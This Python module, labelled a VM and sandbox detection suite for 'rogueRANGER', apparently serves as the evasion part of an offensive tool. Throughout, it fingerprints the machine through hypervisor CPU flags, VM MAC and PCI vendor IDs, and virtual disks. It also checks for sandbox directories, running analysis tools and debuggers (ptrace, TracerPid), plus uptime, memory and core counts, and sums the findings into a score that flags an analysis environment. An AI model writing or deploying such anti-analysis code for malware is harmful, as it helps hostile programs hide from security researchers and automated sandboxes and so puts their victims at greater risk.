#!/usr/bin/env python3
"""
VM and Sandbox Detection Suite for rogueRANGER
Advanced detection techniques for virtualized environments and analysis sandboxes
"""

import os
import sys
import time
import ctypes
import platform
import subprocess
import hashlib
import psutil
import re
from datetime import datetime

class VMSandboxDetector:
    """
    Comprehensive VM, sandbox, and debugger detection
    Uses multiple techniques to identify analysis environments
    """
    
    def __init__(self):
        self.detection_results = {
            'vm_indicators': [],
            'sandbox_indicators': [],
            'debugger_indicators': [],
            'analysis_tools': [],
            'confidence_score': 0
        }
        self.threshold = 3  # Number of indicators needed to trigger detection
        
    def run_full_detection(self):
        """Run all detection methods and return comprehensive results"""
        print("[VM DETECT] Starting comprehensive environment analysis")
        
        # VM Detection
        self.check_cpu_timing()
        self.check_hypervisor_cpuid()
        self.check_mac_vendor()
        self.check_disk_geometry()
        self.check_pci_devices()
        
        # Sandbox Detection
        self.check_sandbox_artifacts()
        self.check_network_latency()
        self.check_user_interaction()
        self.check_system_uptime()
        self.check_memory_size()
        self.check_cpu_cores()
        
        # Debugger Detection
        self.check_debugger_presence()
        self.check_ptrace()
        self.check_proc_status()
        
        # Calculate confidence score
        self.calculate_confidence()
        
        return self.detection_results
    
    def is_sandboxed(self):
        """Quick check - returns True if likely in sandbox/VM"""
        results = self.run_full_detection()
        return results['confidence_score'] >= self.threshold
    
    # ===== CPU & TIMING DETECTION =====
    
    def check_cpu_timing(self):
        """Detect VM via CPU timing anomalies (cache timing attacks)"""
        try:
            iterations = 1000000
            start = time.perf_counter_ns()
            
            # Simple CPU-bound operation
            for _ in range(iterations):
                pass
            
            end = time.perf_counter_ns()
            duration = end - start
            
            # VMs often have more consistent/artificial timing
            # Real hardware has more variance
            variance_tests = []
            for _ in range(5):
                test_start = time.perf_counter_ns()
                for _ in range(iterations // 10):
                    pass
                test_end = time.perf_counter_ns()
                variance_tests.append(test_end - test_start)
            
            variance = max(variance_tests) - min(variance_tests)
            
            # Thresholds (adjust based on testing)
            if duration > 500000000:  # >500ms for 1M iterations
                self.detection_results['vm_indicators'].append('slow_cpu_timing')
                print(f"[VM DETECT] Slow CPU timing: {duration}ns")
            
            if variance < 1000000:  # <1ms variance
                self.detection_results['vm_indicators'].append('low_timing_variance')
                print(f"[VM DETECT] Low timing variance: {variance}ns")
                
        except Exception as e:
            print(f"[VM DETECT] CPU timing check failed: {e}")
    
    def check_hypervisor_cpuid(self):
        """Check CPUID for hypervisor presence"""
        try:
            # Linux: check /proc/cpuinfo
            if os.path.exists('/proc/cpuinfo'):
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read().lower()
                    
                hypervisor_flags = [
                    'hypervisor',
                    'vmx',
                    'svm',
                    'kvm',
                    'virtualbox',
                    'vmware',
                    'qemu',
                    'xen',
                    'hyper-v'
                ]
                
                for flag in hypervisor_flags:
                    if flag in cpuinfo:
                        self.detection_results['vm_indicators'].append(f'cpuid_{flag}')
                        print(f"[VM DETECT] CPUID indicates {flag}")
                        
        except Exception as e:
            print(f"[VM DETECT] CPUID check failed: {e}")
    
    # ===== HARDWARE DETECTION =====
    
    def check_mac_vendor(self):
        """Check MAC address for VM vendor prefixes"""
        try:
            # Common VM MAC address prefixes
            vm_mac_prefixes = [
                '00:05:69',  # VMware
                '00:0c:29',  # VMware
                '00:1c:14',  # VMware
                '00:50:56',  # VMware
                '08:00:27',  # VirtualBox
                '00:15:5d',  # Hyper-V
                '00:1c:42',  # Parallels
                '00:16:3e',  # Xen
                '00:21:f6',  # Virtual Iron
                '52:54:00',  # QEMU/KVM
            ]
            
            # Get MAC addresses
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address.lower()
                        for prefix in vm_mac_prefixes:
                            if mac.startswith(prefix.lower()):
                                self.detection_results['vm_indicators'].append(f'mac_vendor_{prefix}')
                                print(f"[VM DETECT] VM MAC address: {mac}")
                                return
                                
        except Exception as e:
            print(f"[VM DETECT] MAC vendor check failed: {e}")
    
    def check_disk_geometry(self):
        """Check disk geometry for VM indicators"""
        try:
            # Check for virtual disk devices
            disk_indicators = [
                '/dev/vda', '/dev/vdb', '/dev/vdc',  # VirtIO
                '/dev/xvda', '/dev/xvdb',           # Xen
                '/dev/sr0',                         # CD-ROM (common in VMs)
            ]
            
            for disk in disk_indicators:
                if os.path.exists(disk):
                    self.detection_results['vm_indicators'].append(f'virtual_disk_{disk}')
                    print(f"[VM DETECT] Virtual disk detected: {disk}")
                    
            # Check disk size (sandboxes often have small disks)
            try:
                for partition in psutil.disk_partitions():
                    if partition.device.startswith('/dev/'):
                        usage = psutil.disk_usage(partition.mountpoint)
                        if usage.total < 10 * 1024**3:  # <10GB
                            self.detection_results['sandbox_indicators'].append('small_disk')
                            print(f"[VM DETECT] Small disk: {usage.total / 1024**3:.1f}GB")
            except:
                pass
                
        except Exception as e:
            print(f"[VM DETECT] Disk geometry check failed: {e}")
    
    def check_pci_devices(self):
        """Check PCI devices for VM indicators"""
        try:
            if os.path.exists('/proc/bus/pci/devices'):
                with open('/proc/bus/pci/devices', 'r') as f:
                    pci_data = f.read()
                    
                vm_pci_vendors = [
                    '1af4',  # Red Hat VirtIO
                    '80ee',  # VirtualBox
                    '15ad',  # VMware
                    '1234',  # QEMU
                    '1b36',  # QEMU
                ]
                
                for vendor in vm_pci_vendors:
                    if vendor in pci_data:
                        self.detection_results['vm_indicators'].append(f'pci_vendor_{vendor}')
                        print(f"[VM DETECT] VM PCI vendor: {vendor}")
                        
        except Exception as e:
            print(f"[VM DETECT] PCI check failed: {e}")
    
    # ===== SANDBOX ARTIFACTS =====
    
    def check_sandbox_artifacts(self):
        """Check for common sandbox analysis tools and artifacts"""
        try:
            # Common sandbox directories and files
            sandbox_paths = [
                # Cuckoo Sandbox
                '/opt/cuckoo',
                '/var/lib/cuckoo',
                '/tmp/cuckoo',
                
                # Joe Sandbox
                '/opt/joesandbox',
                '/var/lib/joesandbox',
                
                # AnyRun
                '/opt/anyrun',
                
                # Hybrid Analysis
                '/opt/hybrid-analysis',
                
                # VirusTotal
                '/opt/virustotal',
                
                # Common analysis tools
                '/usr/bin/strings',
                '/usr/bin/objdump',
                '/usr/bin/readelf',
                '/usr/bin/strace',
                '/usr/bin/ltrace',
                '/usr/bin/gdb',
                '/usr/bin/radare2',
            ]
            
            for path in sandbox_paths:
                if os.path.exists(path):
                    self.detection_results['sandbox_indicators'].append(f'sandbox_path_{os.path.basename(path)}')
                    print(f"[VM DETECT] Sandbox artifact: {path}")
            
            # Check for analysis tool processes
            analysis_tools = [
                'cuckoo', 'joesandbox', 'any.run', 'hybrid-analysis',
                'wireshark', 'tcpdump', 'procmon', 'regshot',
                'ollydbg', 'x64dbg', 'ida', 'ghidra', 'radare2',
                'strace', 'ltrace', 'gdb', 'valgrind'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for tool in analysis_tools:
                        if tool in proc_name:
                            self.detection_results['analysis_tools'].append(tool)
                            print(f"[VM DETECT] Analysis tool running: {proc_name}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
                    
        except Exception as e:
            print(f"[VM DETECT] Sandbox artifacts check failed: {e}")
    
    def check_user_interaction(self):
        """Check for lack of user interaction (common in sandboxes)"""
        try:
            # Check mouse movement (Linux)
            if os.path.exists('/dev/input/mice'):
                # Try to read mouse device
                pass  # Advanced implementation needed
            
            # Check for active X session
            if 'DISPLAY' in os.environ:
                # Check for active windows
                try:
                    result = subprocess.run(['xdotool', 'getactivewindow'], 
                                          capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        print("[VM DETECT] Active X session detected")
                except:
                    self.detection_results['sandbox_indicators'].append('no_user_interaction')
                    print("[VM DETECT] No user interaction detected")
            else:
                self.detection_results['sandbox_indicators'].append('no_x_session')
                print("[VM DETECT] No X session (headless)")
                
        except Exception as e:
            print(f"[VM DETECT] User interaction check failed: {e}")
    
    def check_system_uptime(self):
        """Check system uptime (sandboxes often have short uptime)"""
        try:
            uptime_seconds = psutil.boot_time()
            current_time = time.time()
            uptime = current_time - uptime_seconds
            
            if uptime < 300:  # <5 minutes
                self.detection_results['sandbox_indicators'].append('short_uptime')
                print(f"[VM DETECT] Short uptime: {uptime:.0f} seconds")
                
        except Exception as e:
            print(f"[VM DETECT] Uptime check failed: {e}")
    
    def check_memory_size(self):
        """Check memory size (sandboxes often have limited RAM)"""
        try:
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024**3:  # <2GB
                self.detection_results['sandbox_indicators'].append('low_memory')
                print(f"[VM DETECT] Low memory: {memory.total / 1024**3:.1f}GB")
                
        except Exception as e:
            print(f"[VM DETECT] Memory check failed: {e}")
    
    def check_cpu_cores(self):
        """Check CPU cores (sandboxes often have few cores)"""
        try:
            cores = psutil.cpu_count(logical=False)
            if cores and cores < 2:
                self.detection_results['sandbox_indicators'].append('few_cpu_cores')
                print(f"[VM DETECT] Few CPU cores: {cores}")
                
        except Exception as e:
            print(f"[VM DETECT] CPU cores check failed: {e}")
    
    # ===== DEBUGGER DETECTION =====
    
    def check_debugger_presence(self):
        """Check for debugger attachment"""
        try:
            # Check parent process
            parent = psutil.Process(os.getppid())
            parent_name = parent.name().lower()
            
            debuggers = ['gdb', 'strace', 'ltrace', 'lldb', 'radare2']
            for debugger in debuggers:
                if debugger in parent_name:
                    self.detection_results['debugger_indicators'].append(f'parent_{debugger}')
                    print(f"[VM DETECT] Debugger parent process: {parent_name}")
                    
        except Exception as e:
            print(f"[VM DETECT] Debugger presence check failed: {e}")
    
    def check_ptrace(self):
        """Check if process is being traced via ptrace"""
        try:
            # Try to ptrace ourselves - will fail if already being traced
            LIBC = ctypes.CDLL(None)
            if hasattr(LIBC, 'ptrace'):
                result = LIBC.ptrace(0, 0, 1, 0)  # PTRACE_TRACEME
                if result == -1:
                    self.detection_results['debugger_indicators'].append('ptrace_active')
                    print("[VM DETECT] Process is being traced (ptrace)")
                    
        except Exception as e:
            print(f"[VM DETECT] Ptrace check failed: {e}")
    
    def check_proc_status(self):
        """Check /proc/self/status for tracer PID"""
        try:
            if os.path.exists('/proc/self/status'):
                with open('/proc/self/status', 'r') as f:
                    status = f.read()
                    
                # Look for TracerPid
                for line in status.split('\n'):
                    if line.startswith('TracerPid:'):
                        tracer_pid = line.split(':')[1].strip()
                        if tracer_pid != '0':
                            self.detection_results['debugger_indicators'].append('tracer_pid')
                            print(f"[VM DETECT] Tracer PID: {tracer_pid}")
                            
        except Exception as e:
            print(f"[VM DETECT] Proc status check failed: {e}")
    
    # ===== NETWORK DETECTION =====
    
    def check_network_latency(self):
        """Check for artificial network latency (sandbox networks)"""
        try:
            # Simple ping test to common destinations
            test_hosts = ['8.8.8.8', '1.1.1.1', 'google.com']
            
            for host in test_hosts:
                try:
                    start = time.time()
                    subprocess.run(['ping', '-c', '1', '-W', '2', host],
                                 capture_output=True, timeout=5)
                    end = time.time()
                    latency = (end - start) * 1000  # ms
                    
                    if latency > 1000:  # >1 second
                        self.detection_results['sandbox_indicators'].append('high_network_latency')
                        print(f"[VM DETECT] High network latency: {latency:.0f}ms to {host}")
                        break
                        
                except subprocess.TimeoutExpired:
                    self.detection_results['sandbox_indicators'].append('network_timeout')
                    print(f"[VM DETECT] Network timeout to {host}")
                    break
                    
        except Exception as e:
            print(f"[VM DETECT] Network latency check failed: {e}")
    
    # ===== HELPER METHODS =====
    
    def calculate_confidence(self):
        """Calculate confidence score based on detected indicators"""
        total_indicators = (
            len(self.detection_results['vm_indicators']) +
            len(self.detection_results['sandbox_indicators']) +
            len(self.detection_results['debugger_indicators']) +
            len(self.detection_results['analysis_tools'])
        )
        
        # Weight different types of indicators
        vm_weight = len(self.detection_results['vm_indicators']) * 1.0
        sandbox_weight = len(self.detection_results['sandbox_indicators']) * 1.2
        debugger_weight = len(self.detection_results['debugger_indicators']) * 1.5
        tools_weight = len(self.detection_results['analysis_tools']) * 2.0
        
        confidence = vm_weight + sandbox_weight + debugger_weight + tools_weight
        self.detection_results['confidence_score'] = confidence
        
        print(f"[VM DETECT] Confidence score: {confidence:.1f}")
        print(f"[VM DETECT] VM indicators: {self.detection_results['vm_indicators']}")
        print(f"[VM DETECT] Sandbox indicators: {self.detection_results['sandbox_indicators']}")
        print(f"[VM DETECT] Debugger indicators: {self.detection_results['debugger_indicators']}")
        print(f"[VM DETECT] Analysis tools: {self.detection_results['analysis_tools']}")